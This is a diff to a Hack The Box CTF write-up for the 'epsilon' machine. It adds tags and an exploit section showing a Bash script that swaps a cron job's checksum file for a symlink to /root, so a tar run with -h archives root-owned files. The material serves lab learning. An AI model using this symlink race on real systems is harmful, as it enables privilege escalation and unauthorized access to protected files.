@@ -3,7 +3,7 @@ layout: writeup
 category: HTB
 date: 2024-12-29
 comments: false
-tags:  
+tags: git gitdumper sourcecode aws flask python aws-lambda jwt ssti jinja2 serversidetemplateinjection burpsuite pspy64 crontab cronjob 
 ---
 
 <br />
@@ -834,5 +834,66 @@ check_file=`date +%N`
 5.- Creates another tar archive using the `-h` flag (which follows symbolic links). It includes the `checksum` file and the previously created backup, and stores it in `/var/backups/web_backups/`.
 
 6.- Deletes all contents in `/opt/backups` again to clean up.
+
+<br />
+
+## Exploit 
+
+<br />
+
+As we mentioned before, the second `tar` command includes the `-h` flag.
+
+<br />
+
+```bash
+tom@epsilon:/tmp/Privesc$ tar --help | grep h 
+...[snip]...
+-h, --dereference          follow symlinks; archive and dump the files they
+...[snip]...
+```
+
+<br />
+
+This means that if we can replace the `checksum` file with a symbolic link pointing to a `root` owned directory or file, it will be followed and archived by the cron job, giving us access to its contents.
+
+To exploit this behavior, we can use the following `Bash` script:
+
+
+
+<br />
+
+```bash
+#!/bin/bash 
+
+#Colours
+greenColour="\e[0;32m\033[1m"
+endColour="\033[0m\e[0m"
+redColour="\e[0;31m\033[1m"
+blueColour="\e[0;34m\033[1m"
+yellowColour="\e[0;33m\033[1m"
+purpleColour="\e[0;35m\033[1m"
+turquoiseColour="\e[0;36m\033[1m"
+grayColour="\e[0;37m\033[1m"
+
+function ctrl_c(){
+  echo -e "\n\n${redColour}[!] Leaving the program...${endColour}\n"
+  tput cnorm; exit 1
+ }
+
+echo -e "\n${yellowColour}[+]${endColour} ${grayColour}Waiting for the checksum file creation...${endColour}"
+
+tput civis
+while true; do 
+  if [ -e "/opt/backups/checksum" ]; then 
+    rm -rf /opt/backups/checksum 
+    echo -e "${yellowColour}[+]${endColour} ${grayColour}Deleting the checksum file...${endColour}"
+    ln -s -f /root /opt/backups/checksum
+    echo -e "${yellowColour}[+]${endColour} ${grayColour}Replacing checksum file by a malicious one...${endColour}"
+    echo -e "${yellowColour}[+]${endColour} ${grayColour}Exploited successfully!${endColour}\n"
+    tput cnorm 
+    exit 0
+  fi
+done
+```
 
 <br />
